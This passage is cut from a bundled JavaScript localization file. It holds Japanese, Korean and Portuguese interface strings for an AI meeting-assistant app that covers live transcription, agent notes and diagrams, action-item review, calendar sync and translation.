\"configuration_1\":\"ライブ収録ではブラウザーのマイクアクセスを許可します。必要に応じて、設定で iCalendar のパスまたは URL、ローカルタスク台帳、エージェントロール、音声認識の修正用語を指定します。\",\"description\":\"AIミーティングアシスタント。ライブ会議を文字起こしし、進行中に構造化されたノートとダイアグラムを保持し、アクションアイテムを抽出し、ファイリング前に確認できます。\",\"display_name\":\"会議\",\"highlight_1\":\"Kiro Crew独自の音声テキスト変換によるライブ文字起こし—追加のデーモンなし、既に使用しているもの以上のクラウドアカウントなし\",\"highlight_2\":\"エージェントのチームが会議で並列に作業します。構造化されたノート、HTML/Mermaidダイアグラム、アクションアイテムリスト\",\"highlight_3\":\"ドメイン辞書で音声テキスト変換の誤りを一度修正すると、その後のすべての会議で修正されます\",\"highlight_4\":\"抽出したアクションアイテムを確認してからファイリング—ノイズはアーカイブし、残りをファイル\",\"highlight_5\":\"プラグ可能なタスクとカレンダープロバイダ。ローカルタスク台帳とiCalendar(.ics)リーダーが付属し、組織は独自のものを登録できます\",\"highlight_6\":\"ミーティングの進行中に、文字起こしを別の言語で 1 行ずつ読み返せます\",\"highlight_7\":\"エージェントのノートと並べて自分のノートを残せます — スクリーンショットを貼り付けると、ミーティングの経過時間つきで記録されます\",\"page_label\":\"会議\",\"use_case_1\":\"ライブ会議を記録しながら、複数のエージェントがトランスクリプト、構造化ノート、図、アクションアイテムのレビューを並行して作成します。\"},\"meeting\":{\"agentsPaused\":\"繰り返されるエラー後、エージェントが停止しました。\",\"attachPrompt\":\"エージェントと共有するリンクを貼り付けます\",\"back\":\"戻る\",\"endAndReview\":\"終了して確認\",\"ended\":\"終了\",\"endingReview\":\"終了処理中 — レビューを準備しています…\",\"live\":\"ライブ\",\"loadFailed\":\"この会議を開くことができませんでした\",\"moreActions\":\"その他の操作\",\"noAgents\":\"有効なエージェントなし\",\"noAgentsHint\":\"上部のバーで1つを有効にするか、プリセットを選択してください。\",\"pause\":\"一時停止\",\"paused\":\"一時停止中\",\"pausing\":\"一時停止中…\",\"refresh\":\"更新\",\"restart\":\"もう一度開始\",\"resuming\":\"再開中…\",\"retryAgents\":\"再試行\",\"start\":\"開始\",\"titleLabel\":\"ミーティングのタイトル\",\"toggleNote\":\"マイノート\",\"toggleTasks\":\"アクションアイテム\",\"toggleTranslation\":\"翻訳\",\"unpause\":\"再開\"},\"note\":{\"close\":\"ノートを閉じる\",\"edit\":\"編集\",\"editorLabel\":\"ノートの本文\",\"hint\":\"入力すると自動的に保存されます。\",\"loadFailed\":\"ノートをディスクから読み取れませんでした。上書きを防ぐため編集を一時停止しています。パネルを閉じて開き直すと再試行します。\",\"loading\":\"ノートを読み込み中…\",\"paused\":\"編集を一時停止中\",\"placeholder\":\"自分用のメモをここに入力します。Markdown が使えます。\",\"preview\":\"プレビュー\",\"saved\":\"保存済み\",\"saving\":\"保存中…\",\"title\":\"マイノート\",\"unsaved\":\"未保存の変更\",\"uploading\":\"画像を追加中…\"},\"pillBar\":{\"addLink\":\"リンクを追加\",\"agentMuted\":\"{{name}}は聞いていません\",\"attachmentsMenu\":\"添付ファイル\",\"createPreset\":\"プリセットを作成\",\"disableAgent\":\"{{name}}をオフにする\",\"enableAgent\":\"{{name}}をオンにする\",\"listening\":\"聞いています\",\"manageAgents\":\"エージェントを管理\",\"manageAttachments\":\"添付ファイルを管理\",\"noAttachments\":\"添付ファイルなし\",\"noPreset\":\"プリセットなし\",\"presetDefaultOption\":\"{{name}}（デフォルト）\",\"presetLabel\":\"エージェントプリセット\",\"removeAttachment\":\"{{label}}を削除\",\"usingDefaultPreset\":\"デフォルトプリセットを使用中\"},\"priority\":{\"high\":\"高\",\"low\":\"低\",\"medium\":\"中\"},\"review\":{\"allDone\":\"すべてレビュー完了\",\"archive\":\"アーカイブ\",\"archiveAll\":\"残りをアーカイブ\",\"archiveOthers_other\":\"他の{{count}}件をアーカイブ\",\"archiveSkipsFiling\":\"登録中の項目は対象外です\",\"archivedSection\":\"アーカイブ済み\",\"assignedTo\":\"{{name}}に割り当て\",\"backToMeeting\":\"ミーティングに戻る\",\"closeBlocked_other\":\"{{count}}件の決定が必要です\",\"closeMeeting\":\"ミーティングを終了\",\"file\":\"ファイル\",\"filedSection\":\"{{provider}}に提出\",\"filing\":\"提出中…\",\"nothingPending\":\"レビュー待ちなし\",\"nothingPendingHint\":\"すべてのアクションアイテムがファイルされるか、アーカイブされました。\",\"pendingSection\":\"保留中\",\"remaining_other\":\"{{count}}件レビュー待ち\",\"statArchived\":\"アーカイブ済み\",\"statFiled\":\"提出済み\",\"statPending\":\"保留中\",\"title\":\"アクションアイテムレビュー\",\"unarchive\":\"復元\"},\"session\":{\"agentToggleFailed\":\"そのエージェントを変更できませんでした。\",\"agentsResumed\":\"エージェントが再開されました。\",\"anotherMeetingActive\":\"別のミーティングが既に実行中です。先に終了してください。\",\"anotherMeetingActiveNamed\":\"「{{title}}」はまだ実行中です。会議で開き、先に「終了して確認」を選んでください。\",\"anotherMeetingReviewing\":\"「{{title}}」はまだ確認中です。会議で開き、先に「ミーティングを終了」を選んでください。\",\"attachmentFailed\":\"添付ファイルを更新できませんでした。\",\"broadcastFailed\":\"エージェントに到達できませんでした。\",\"broadcastSent\":\"聞いているエージェントに送信されました。\",\"ended\":\"ミーティング終了。\",\"messageFailed\":\"そのメッセージを送信できませんでした。\",\"minutesRevertFailed\":\"編集を破棄できませんでした。\",\"minutesSaveFailed\":\"編集を保存できませんでした。\",\"noteImageFailed\":\"その画像を追加できませんでした。PNG、JPEG、GIF、WebP のいずれかを貼り付けてください。\",\"noteImageTooLarge\":\"その画像は大きすぎてノートに追加できません。\",\"noteSaveFailed\":\"ノートを保存できませんでした。\",\"openVoiceSettings\":\"音声設定を開く\",\"renameFailed\":\"ミーティングの名前を変更できませんでした。\",\"startFailed\":\"ミーティングを開始できませんでした。\",\"started\":\"ミーティング開始。\",\"statusFailed\":\"ミーティングステータスを変更できませんでした。\",\"stopFailed\":\"ミーティングを終了できませんでした。\",\"sttConnectionFailed\":\"文字起こしに接続できませんでした。\",\"sttDisconnected\":\"文字起こしが切断されました。\",\"sttDispatchFailed\":\"トランスクリプトセグメントをエージェントに配信できませんでした。\",\"sttMicDenied\":\"マイクアクセスが拒否されました。\",\"sttStreamingDisabled\":\"ライブ文字起こしがオフです。設定 → 音声 で、音声入力が有効か、プロバイダーがストリーミングに対応しているか、ストリーミングがオンかを確認してください。\",\"sttUnavailable\":\"文字起こしは利用できません。\",\"sttUnsupported\":\"このブラウザーは音声録音に対応していません。\",\"sttWorkletFailed\":\"オーディオプロセッサを開始できませんでした。\",\"taskAddFailed\":\"そのアクションアイテムを追加できませんでした。\",\"taskFileFailed\":\"そのアクションアイテムをファイルできませんでした。\",\"taskFiled\":\"アクションアイテムがファイルされました。\",\"untitled\":\"無題のミーティング\"},\"settings\":{\"addTerm\":\"追加\",\"agentsHelp\":\"ミーティングが提供するエージェントと、どれがデフォルトで有効になるか。\",\"agentsTitle\":\"エージェント\",\"aliasesLabel\":\"聞き間違い表記\",\"aliasesPlaceholder\":\"文字起こしが聞く内容、コンマ区切り…\",\"back\":\"戻る\",\"calendarHelp\":\"今後のミーティングが読み込まれる場所。\",\"calendarProviderLabel\":\"カレンダープロバイダ\",\"calendarSourceHint\":\"ローカルの.icsファイルへのパス、またはそのhttps URL。\",\"calendarSourceLabel\":\"カレンダーソース\",\"calendarSourcePlaceholder\":\".icsファイルへのパスまたはURL…\",\"calendarTitle\":\"カレンダー\",\"correctLabel\":\"正しい用語\",\"correctPlaceholder\":\"正しくは…\",\"dictionaryHelp\":\"繰り返される文字起こしの間違いを一度修正すると、すべての後続ミーティングで正しくなります。\",\"dictionaryTitle\":\"音声辞書\",\"enabledByDefault\":\"{{name}}をデフォルトで有効にする\",\"noTerms\":\"修正なし\",\"noTermsHint\":\"文字起こしが聞き間違える内容を左に、正しい内容を右に追加してください。\",\"removeTerm\":\"{{term}}を削除\",\"saveFailed\":\"設定を保存できませんでした。\",\"saveSource\":\"保存\",\"saved\":\"保存されました。\",\"subtitle\":\"プロバイダ、エージェント、および音声辞書\",\"taskProviderHelp\":\"レビュー済みアクションアイテムがファイルされる場所。\",\"taskProviderTitle\":\"タスクプロバイダ\",\"termFailed\":\"その修正を追加できませんでした。\",\"termIncomplete\":\"聞こえた内容と正しい内容を入力してください。\",\"title\":\"ミーティング設定\",\"translationHelp\":\"発話された各行を別の言語に翻訳し、ミーティング中にサイドパネルへ表示します。1 行につき 1 回のモデル呼び出しが発生するため、デフォルトではオフです。\",\"translationOff\":\"オフ\",\"translationTitle\":\"ライブ翻訳\"},\"taskSidebar\":{\"add\":\"追加\",\"assigneeLabel\":\"割当人\",\"close\":\"アクションアイテムを閉じる\",\"deleteTask\":\"このアクションアイテムを削除\",\"descriptionLabel\":\"アクションアイテム\",\"empty\":\"まだ抽出されていません。\",\"filed\":\"提出済み\",\"heading_other\":\"{{count}}個のアクションアイテム\",\"priorityLabel\":\"優先度\",\"quickAddPlaceholder\":\"アクションアイテムを追加…\",\"title\":\"アクションアイテム\",\"unassigned\":\"未割当\"},\"transcript\":{\"empty\":\"文字起こしはまだありません\",\"emptyHintLive\":\"会議が進むと、確定した発言がここに表示されます。\",\"emptyHintPaused\":\"一時停止中 — 再開後に発話がここに表示されます。\",\"emptyHintRecorded\":\"この会議では文字起こしが記録されませんでした。\",\"full\":\"文字起こしが上限に達しました。新しい音声や一斉送信は記録されず、エージェントにも送信されません。\",\"jumpToLatest\":\"最新に移動\",\"live\":\"ライブ\",\"regionLabel\":\"会議の文字起こし\",\"title\":\"文字起こし\",\"typed\":\"入力\"},\"translation\":{\"close\":\"翻訳を閉じる\",\"dropped\":\"追いつくために一部の行がスキップされました。\",\"empty\":\"まだ翻訳はありません\",\"emptyHint\":\"発話されると、ここに行が表示されます。\",\"lineFailed\":\"この行を翻訳できませんでした。\",\"loading\":\"読み込み中…\",\"pending\":\"追いついています…\",\"title\":\"翻訳\"},\"widgetType\":{\"chat\":\"チャット\",\"html\":\"図\",\"markdown\":\"ノート\"}}}"),
		components: { "confirmDialog": { "cancel": "キャンセル" } }
	},
	ko: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"{{name}}의 출력이 여기에 표시됩니다.\",\"cancel\":\"취소\",\"chatEmpty\":\"{{name}}에 아직 보낸 내용이 없습니다.\",\"collapse\":\"{{name}}을(를) 나란히 보기로 되돌리기\",\"diagramFrameTitle\":\"{{name}} 다이어그램\",\"discardDraft\":\"저장하지 않은 변경 사항 버리기\",\"discardDraftHint\":\"저장하지 않은 변경 사항은 영구적으로 삭제됩니다.\",\"edit\":\"이 출력 편집\",\"edited\":\"편집됨\",\"editorLabel\":\"{{name}} 출력, 편집 가능\",\"expand\":\"{{name}} 확대\",\"listeningHint\":\"회의를 듣고 있습니다\",\"messagePlaceholder\":\"{{name}}에 메시지 보내기…\",\"mute\":\"{{name}} 음소거\",\"mutedHint\":\"회의를 듣지 않습니다\",\"revert\":\"내 편집 취소\",\"revertHint\":\"내 편집을 영구적으로 삭제하고 {{name}}이(가) 작성한 내용 표시\",\"save\":\"저장\",\"saving\":\"저장 중…\",\"send\":\"보내기\",\"showChat\":\"채팅 표시\",\"showOutput\":\"출력 표시\",\"staleEdit\":\"편집한 뒤 {{name}}이(가) 내용을 더 작성했습니다. 표시된 것은 사용자의 버전입니다. 에이전트의 버전을 보려면 편집을 취소하세요.\",\"unmute\":\"{{name}} 음소거 해제\"},\"broadcastBar\":{\"heard\":\"인식된 내용: {{text}}\",\"pausedPlaceholder\":\"에이전트 일시 중지됨 — 보내려면 재개하세요\",\"pausingPlaceholder\":\"일시 중지 중 — 보낼 수 없음\",\"placeholder\":\"듣고 있는 모든 에이전트에게 말하기…\",\"resumingPlaceholder\":\"재개 중 — 곧 보내기가 가능해집니다\",\"send\":\"보내기\"},\"list\":{\"adHocTitle\":\"즉석 회의\",\"deleteConfirm\":\"‘{{title}}’과(와) 모든 노트, 다이어그램, 액션 아이템을 삭제하시겠습니까? 되돌릴 수 없습니다.\",\"deleteFailed\":\"이 회의를 삭제할 수 없습니다.\",\"deleteMeeting\":\"{{title}} 삭제\",\"deleteUnavailable\":\"삭제하기 전에 이 회의를 종료하세요\",\"deleted\":\"‘{{title}}’을(를) 삭제했습니다\",\"empty\":\"회의 없음\",\"emptyHintNoCalendar\":\"설정에서 캘린더를 연결하거나 즉석 회의를 시작하세요.\",\"emptyHintSynced\":\"캘린더에 일정이 없고, 아직 진행한 회의도 없습니다.\",\"filterPlaceholder\":\"회의 필터…\",\"hasNotes\":\"노트 있음\",\"liveBanner\":\"{{title}} 진행 중\",\"newMeeting\":\"새 회의\",\"returnToMeeting\":\"회의로 돌아가기\",\"reviewing\":\"검토 중\",\"reviewingBanner\":\"{{title}}이(가) 액션 아이템 검토를 기다리고 있습니다\",\"sectionTitle\":\"모든 회의\",\"settings\":\"설정\",\"statLive\":\"진행 중\",\"statScheduled\":\"예정\",\"statWorked\":\"진행함\",\"subtitle\":\"회의가 진행되는 동안의 실시간 노트, 다이어그램, 액션 아이템\",\"syncCalendar\":\"캘린더 동기화\",\"syncFailed\":\"캘린더를 동기화할 수 없습니다.\",\"synced_other\":\"일정 {{count}}개를 동기화했습니다\",\"title\":\"회의\"},\"manifest\":{\"configuration_1\":\"실시간 캡처에는 브라우저 마이크 액세스를 허용하세요. 필요하면 설정에서 iCalendar 경로 또는 URL, 로컬 작업 원장, 에이전트 역할, 음성 인식 교정 용어를 구성하세요.\",\"description\":\"AI 회의 도우미입니다. 진행 중인 회의를 전사하고, 진행에 맞춰 구조화된 노트와 다이어그램을 유지하며, 액션 아이템을 추출해 등록 전에 검토할 수 있게 합니다.\",\"display_name\":\"회의\",\"highlight_1\":\"Kiro Crew 자체 음성 인식으로 실시간 전사 — 추가 데몬도, 이미 쓰고 있는 것 외의 클라우드 계정도 필요 없습니다\",\"highlight_2\":\"에이전트 팀이 회의를 병렬로 처리합니다: 구조화된 노트, HTML/Mermaid 다이어그램, 액션 아이템 목록\",\"highlight_3\":\"반복되는 음성 인식 오류를 도메인 사전으로 한 번 고치면 이후 모든 회의에서 올바르게 인식됩니다\",\"highlight_4\":\"등록 전에 추출된 액션 아이템을 검토합니다 — 불필요한 것은 보관하고 나머지는 등록하세요\",\"highlight_5\":\"교체 가능한 작업·캘린더 제공자: 로컬 작업 원장과 iCalendar (.ics) 리더를 기본 제공하며, 조직이 자체 제공자를 등록할 수 있습니다\",\"highlight_6\":\"회의가 진행되는 동안 전사를 다른 언어로 한 줄씩 읽을 수 있습니다\",\"highlight_7\":\"에이전트의 노트 옆에 나만의 노트를 남길 수 있습니다 — 스크린샷을 붙여넣으면 회의 경과 시간과 함께 기록됩니다\",\"page_label\":\"회의\",\"use_case_1\":\"실시간 회의를 캡처하는 동안 여러 에이전트가 대화 기록, 구조화된 노트, 다이어그램, 액션 아이템 검토를 병렬로 만듭니다.\"},\"meeting\":{\"agentsPaused\":\"오류가 반복되어 에이전트가 중지되었습니다.\",\"attachPrompt\":\"에이전트와 공유할 링크를 붙여 넣으세요\",\"back\":\"뒤로\",\"endAndReview\":\"종료하고 검토\",\"ended\":\"종료됨\",\"endingReview\":\"종료 중 — 검토를 준비하고 있습니다…\",\"live\":\"진행 중\",\"loadFailed\":\"이 회의를 열 수 없습니다\",\"moreActions\":\"추가 작업\",\"noAgents\":\"활성화된 에이전트 없음\",\"noAgentsHint\":\"위쪽 바에서 하나를 켜거나 프리셋을 선택하세요.\",\"pause\":\"일시 중지\",\"paused\":\"일시 중지됨\",\"pausing\":\"일시 중지 중…\",\"refresh\":\"새로 고침\",\"restart\":\"다시 시작\",\"resuming\":\"재개 중…\",\"retryAgents\":\"재시도\",\"start\":\"시작\",\"titleLabel\":\"회의 제목\",\"toggleNote\":\"내 노트\",\"toggleTasks\":\"액션 아이템\",\"toggleTranslation\":\"번역\",\"unpause\":\"재개\"},\"note\":{\"close\":\"노트 닫기\",\"edit\":\"편집\",\"editorLabel\":\"노트 본문\",\"hint\":\"입력하면 자동으로 저장됩니다.\",\"loadFailed\":\"노트를 디스크에서 읽을 수 없습니다. 덮어쓰지 않도록 편집을 잠시 멈췄습니다. 패널을 닫고 다시 열면 다시 시도합니다.\",\"loading\":\"노트를 불러오는 중…\",\"paused\":\"편집 일시 중지\",\"placeholder\":\"여기에 나만의 메모를 입력하세요. Markdown을 사용할 수 있습니다.\",\"preview\":\"미리보기\",\"saved\":\"저장됨\",\"saving\":\"저장 중…\",\"title\":\"내 노트\",\"unsaved\":\"저장되지 않은 변경 사항\",\"uploading\":\"이미지 추가 중…\"},\"pillBar\":{\"addLink\":\"링크 추가\",\"agentMuted\":\"{{name}}이(가) 듣지 않습니다\",\"attachmentsMenu\":\"첨부 파일\",\"createPreset\":\"프리셋 만들기\",\"disableAgent\":\"{{name}} 끄기\",\"enableAgent\":\"{{name}} 켜기\",\"listening\":\"듣고 있음\",\"manageAgents\":\"에이전트 관리\",\"manageAttachments\":\"첨부 파일 관리\",\"noAttachments\":\"첨부 파일 없음\",\"noPreset\":\"프리셋 없음\",\"presetDefaultOption\":\"{{name}} (기본값)\",\"presetLabel\":\"에이전트 프리셋\",\"removeAttachment\":\"{{label}} 제거\",\"usingDefaultPreset\":\"기본 프리셋 사용 중\"},\"priority\":{\"high\":\"높음\",\"low\":\"낮음\",\"medium\":\"보통\"},\"review\":{\"allDone\":\"검토 완료\",\"archive\":\"보관\",\"archiveAll\":\"나머지 보관\",\"archiveOthers_other\":\"나머지 {{count}}건 보관\",\"archiveSkipsFiling\":\"등록 중인 항목은 제외됩니다\",\"archivedSection\":\"보관됨\",\"assignedTo\":\"{{name}}에게 할당됨\",\"backToMeeting\":\"회의로 돌아가기\",\"closeBlocked_other\":\"{{count}}건에 대한 결정이 필요합니다\",\"closeMeeting\":\"회의 마감\",\"file\":\"등록\",\"filedSection\":\"{{provider}}에 등록됨\",\"filing\":\"등록 중…\",\"nothingPending\":\"검토할 항목 없음\",\"nothingPendingHint\":\"모든 액션 아이템이 등록되거나 보관되었습니다.\",\"pendingSection\":\"대기 중\",\"remaining_other\":\"{{count}}건 검토 남음\",\"statArchived\":\"보관됨\",\"statFiled\":\"등록됨\",\"statPending\":\"대기 중\",\"title\":\"액션 아이템 검토\",\"unarchive\":\"복원\"},\"session\":{\"agentToggleFailed\":\"해당 에이전트를 변경할 수 없습니다.\",\"agentsResumed\":\"에이전트가 다시 실행되고 있습니다.\",\"anotherMeetingActive\":\"다른 회의가 이미 진행 중입니다. 먼저 종료하세요.\",\"anotherMeetingActiveNamed\":\"‘{{title}}’이(가) 아직 진행 중입니다. 회의에서 열고 먼저 ‘종료하고 검토’를 선택하세요.\",\"anotherMeetingReviewing\":\"‘{{title}}’이(가) 아직 검토 중입니다. 회의에서 열고 먼저 ‘회의 마감’을 선택하세요.\",\"attachmentFailed\":\"첨부 파일을 업데이트할 수 없습니다.\",\"broadcastFailed\":\"에이전트에 연결할 수 없습니다.\",\"broadcastSent\":\"듣고 있는 에이전트에게 보냈습니다.\",\"ended\":\"회의가 종료되었습니다.\",\"messageFailed\":\"해당 메시지를 보낼 수 없습니다.\",\"minutesRevertFailed\":\"편집을 취소할 수 없습니다.\",\"minutesSaveFailed\":\"편집을 저장할 수 없습니다.\",\"noteImageFailed\":\"이미지를 추가할 수 없습니다. PNG, JPEG, GIF, WebP 중 하나를 붙여넣으세요.\",\"noteImageTooLarge\":\"이미지가 너무 커서 노트에 추가할 수 없습니다.\",\"noteSaveFailed\":\"노트를 저장할 수 없습니다.\",\"openVoiceSettings\":\"음성 설정 열기\",\"renameFailed\":\"회의 이름을 변경할 수 없습니다.\",\"startFailed\":\"회의를 시작할 수 없습니다.\",\"started\":\"회의가 시작되었습니다.\",\"statusFailed\":\"회의 상태를 변경할 수 없습니다.\",\"stopFailed\":\"회의를 종료할 수 없습니다.\",\"sttConnectionFailed\":\"전사에 연결할 수 없습니다.\",\"sttDisconnected\":\"전사 연결이 끊어졌습니다.\",\"sttDispatchFailed\":\"전사 구간을 에이전트에 전달할 수 없습니다.\",\"sttMicDenied\":\"마이크 액세스가 거부되었습니다.\",\"sttStreamingDisabled\":\"실시간 전사가 꺼져 있습니다. 설정 → 음성에서 음성 입력이 켜져 있는지, 제공자가 스트리밍을 지원하는지, 스트리밍이 켜져 있는지 확인하세요.\",\"sttUnavailable\":\"전사를 사용할 수 없습니다.\",\"sttUnsupported\":\"이 브라우저는 오디오를 녹음할 수 없습니다.\",\"sttWorkletFailed\":\"오디오 프로세서를 시작할 수 없습니다.\",\"taskAddFailed\":\"해당 액션 아이템을 추가할 수 없습니다.\",\"taskFileFailed\":\"해당 액션 아이템을 등록할 수 없습니다.\",\"taskFiled\":\"액션 아이템을 등록했습니다.\",\"untitled\":\"제목 없는 회의\"},\"settings\":{\"addTerm\":\"용어 추가\",\"agentsHelp\":\"회의에서 제공하는 에이전트와 그중 처음부터 활성화되는 에이전트입니다.\",\"agentsTitle\":\"에이전트\",\"aliasesLabel\":\"잘못 인식된 표기\",\"aliasesPlaceholder\":\"전사가 인식하는 내용, 쉼표로 구분…\",\"back\":\"뒤로\",\"calendarHelp\":\"예정된 회의를 읽어 오는 위치입니다.\",\"calendarProviderLabel\":\"캘린더 제공자\",\"calendarSourceHint\":\"로컬 .ics 파일의 경로 또는 해당 파일의 https URL입니다.\",\"calendarSourceLabel\":\"캘린더 소스\",\"calendarSourcePlaceholder\":\".ics 파일의 경로 또는 URL…\",\"calendarTitle\":\"캘린더\",\"correctLabel\":\"올바른 용어\",\"correctPlaceholder\":\"올바른 표기…\",\"dictionaryHelp\":\"반복되는 전사 오류를 한 번 고치면 이후 모든 회의에서 올바르게 인식됩니다.\",\"dictionaryTitle\":\"음성 사전\",\"enabledByDefault\":\"{{name}}을(를) 기본으로 활성화\",\"noTerms\":\"수정 항목 없음\",\"noTermsHint\":\"왼쪽에는 전사가 잘못 인식하는 표기를, 오른쪽에는 올바른 표기를 추가하세요.\",\"removeTerm\":\"{{term}} 제거\",\"saveFailed\":\"설정을 저장할 수 없습니다.\",\"saveSource\":\"저장\",\"saved\":\"저장되었습니다.\",\"subtitle\":\"제공자, 에이전트, 음성 사전\",\"taskProviderHelp\":\"검토된 액션 아이템이 등록되는 위치입니다.\",\"taskProviderTitle\":\"작업 제공자\",\"termFailed\":\"해당 수정 항목을 추가할 수 없습니다.\",\"termIncomplete\":\"인식된 내용과 올바른 표기를 입력하세요.\",\"title\":\"회의 설정\",\"translationHelp\":\"발화된 각 줄을 다른 언어로 번역해 회의 중 사이드 패널에 표시합니다. 한 줄마다 모델 호출이 한 번 발생하므로 기본적으로 꺼져 있습니다.\",\"translationOff\":\"끄기\",\"translationTitle\":\"실시간 번역\"},\"taskSidebar\":{\"add\":\"항목 추가\",\"assigneeLabel\":\"담당자\",\"close\":\"액션 아이템 닫기\",\"deleteTask\":\"이 액션 아이템 삭제\",\"descriptionLabel\":\"액션 아이템\",\"empty\":\"아직 추출된 항목이 없습니다.\",\"filed\":\"등록됨\",\"heading_other\":\"액션 아이템 {{count}}개\",\"priorityLabel\":\"우선순위\",\"quickAddPlaceholder\":\"액션 아이템 추가…\",\"title\":\"액션 아이템\",\"unassigned\":\"미할당\"},\"transcript\":{\"empty\":\"아직 기록이 없습니다\",\"emptyHintLive\":\"회의가 진행되면 확정된 음성이 여기에 표시됩니다.\",\"emptyHintPaused\":\"일시 중지됨 — 재개하면 음성이 여기에 표시됩니다.\",\"emptyHintRecorded\":\"이 회의에는 기록된 내용이 없습니다.\",\"full\":\"기록 용량이 가득 찼습니다. 새로운 음성과 브로드캐스트는 더 이상 기록되거나 에이전트에게 전송되지 않습니다.\",\"jumpToLatest\":\"최신 내용으로 이동\",\"live\":\"실시간\",\"regionLabel\":\"회의 기록\",\"title\":\"기록\",\"typed\":\"입력됨\"},\"translation\":{\"close\":\"번역 닫기\",\"dropped\":\"따라잡기 위해 일부 줄을 건너뛰었습니다.\",\"empty\":\"아직 번역된 내용이 없습니다\",\"emptyHint\":\"발화가 있으면 여기에 줄이 표시됩니다.\",\"lineFailed\":\"이 줄을 번역할 수 없습니다.\",\"loading\":\"불러오는 중…\",\"pending\":\"따라잡는 중…\",\"title\":\"번역\"},\"widgetType\":{\"chat\":\"채팅\",\"html\":\"다이어그램\",\"markdown\":\"노트\"}}}"),
		components: { "confirmDialog": { "cancel": "취소" } }
	},
	pt: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"O resultado de {{name}} aparecerá aqui.\",\"cancel\":\"Cancelar\",\"chatEmpty\":\"Ainda não foi enviado nada para {{name}}.\",\"collapse\":\"Restaurar {{name}} ao layout lado a lado\",\"diagramFrameTitle\":\"Diagrama de {{name}}\",\"discardDraft\":\"Descartar as alterações não salvas\",\"discardDraftHint\":\"As alterações não salvas serão excluídas permanentemente.\",\"edit\":\"Editar esta saída\",\"edited\":\"Editado\",\"editorLabel\":\"Saída de {{name}}, editável\",\"expand\":\"Expandir {{name}}\",\"listeningHint\":\"Está a ouvir a reunião\",\"messagePlaceholder\":\"Mensagem para {{name}}…\",\"mute\":\"Silenciar {{name}}\",\"mutedHint\":\"Não está a ouvir a reunião\",\"revert\":\"Descartar minhas edições\",\"revertHint\":\"Excluir permanentemente minhas edições e mostrar o que {{name}} escreveu\",\"save\":\"Salvar\",\"saving\":\"Salvando…\",\"send\":\"Enviar\",\"showChat\":\"Mostrar a conversa\",\"showOutput\":\"Mostrar o resultado\",\"staleEdit\":\"{{name}} escreveu mais desde que você editou este texto. Sua versão está sendo exibida; descarte suas edições para ver a dele.\",\"unmute\":\"Reativar {{name}}\"},\"broadcastBar\":{\"heard\":\"Ouvido: {{text}}\",\"pausedPlaceholder\":\"Agentes pausados — retome para enviar\",\"pausingPlaceholder\":\"Pausando — envio indisponível\",\"placeholder\":\"Diga algo a todos os agentes à escuta…\",\"resumingPlaceholder\":\"Retomando — o envio estará disponível em breve\",\"send\":\"Enviar\"},\"list\":{\"adHocTitle\":\"Reunião improvisada\",\"deleteConfirm\":\"Eliminar “{{title}}” e todas as respetivas notas, diagramas e tarefas? Esta ação não pode ser anulada.\",\"deleteFailed\":\"Não foi possível eliminar esta reunião.\",\"deleteMeeting\":\"Eliminar {{title}}\",\"deleteUnavailable\":\"Termine esta reunião antes de a eliminar\",\"deleted\":\"“{{title}}” foi eliminada\",\"empty\":\"Sem reuniões\",\"emptyHintNoCalendar\":\"Ligue um calendário nas definições, ou comece uma reunião improvisada.\",\"emptyHintSynced\":\"Nada no calendário, e nenhuma reunião trabalhada até agora.\",\"filterPlaceholder\":\"Filtrar reuniões…\",\"hasNotes\":\"Tem notas\",\"liveBanner\":\"{{title}} está em direto\",\"newMeeting\":\"Nova reunião\",\"returnToMeeting\":\"Voltar à reunião\",\"reviewing\":\"Em revisão\",\"reviewingBanner\":\"{{title}} está à espera da revisão das tarefas\",\"sectionTitle\":\"Todas as reuniões\",\"settings\":\"Definições\",\"statLive\":\"Em direto\",\"statScheduled\":\"Agendadas\",\"statWorked\":\"Trabalhadas\",\"subtitle\":\"Notas, diagramas e tarefas em direto enquanto a reunião acontece\",\"syncCalendar\":\"Sincronizar o calendário\",\"syncFailed\":\"Não foi possível sincronizar o calendário.\",\"synced_many\":\"{{count}} eventos sincronizados\",\"synced_one\":\"{{count}} evento sincronizado\",\"synced_other\":\"{{count}} eventos sincronizados\",\"title\":\"Reuniões\"},\"manifest\":{\"configuration_1\":\"Permita que o navegador acesse o microfone para a captura ao vivo; configure opcionalmente em Configurações um caminho ou URL do iCalendar, o ledger local de tarefas, papéis de agente e termos de correção de fala.\",\"description\":\"Um assistente de reuniões com IA. Transcreve uma reunião ao vivo, mantém notas estruturadas e diagramas conforme ela avança, extrai itens de ação e deixa você revisá-los antes de registrar.\",\"display_name\":\"Reuniões\",\"highlight_1\":\"Transcrição ao vivo pelo próprio reconhecimento de fala do Kiro Crew — sem daemon extra, sem conta na nuvem além das que você já usa\",\"highlight_2\":\"Um grupo de agentes trabalha a reunião em paralelo: notas estruturadas, um diagrama HTML/Mermaid e uma lista de itens de ação\",\"highlight_3\":\"Corrija os erros recorrentes do reconhecimento de fala uma vez, com um dicionário do domínio, e todas as reuniões seguintes acertam\",\"highlight_4\":\"Revise os itens de ação extraídos antes de qualquer registro — arquive o ruído, registre o resto\",\"highlight_5\":\"Provedores de tarefas e de calendário conectáveis: já inclui um registro local de tarefas e um leitor de iCalendar (.ics), e uma organização pode registrar os seus próprios\",\"highlight_6\":\"Leia a transcrição linha a linha em outro idioma enquanto a reunião acontece\",\"highlight_7\":\"Mantenha suas próprias notas ao lado das dos agentes — cole uma captura de tela e ela entra com o tempo decorrido da reunião\",\"page_label\":\"Reuniões\",\"use_case_1\":\"Capture uma reunião ao vivo enquanto agentes paralelos produzem a transcrição, notas estruturadas, diagrama e revisão dos itens de ação.\"},\"meeting\":{\"agentsPaused\":\"Os agentes pararam após várias falhas.\",\"attachPrompt\":\"Cole um link para partilhar com os agentes\",\"back\":\"Voltar\",\"endAndReview\":\"Terminar e revisar\",\"ended\":\"Terminada\",\"endingReview\":\"Encerrando — preparando a revisão…\",\"live\":\"Em direto\",\"loadFailed\":\"Não foi possível abrir esta reunião\",\"moreActions\":\"Mais ações\",\"noAgents\":\"Nenhum agente ativo\",\"noAgentsHint\":\"Ative um na barra acima, ou escolha uma predefinição.\",\"pause\":\"Pausar\",\"paused\":\"Em pausa\",\"pausing\":\"Pausando…\",\"refresh\":\"Atualizar\",\"restart\":\"Reiniciar\",\"resuming\":\"Retomando…\",\"retryAgents\":\"Tentar de 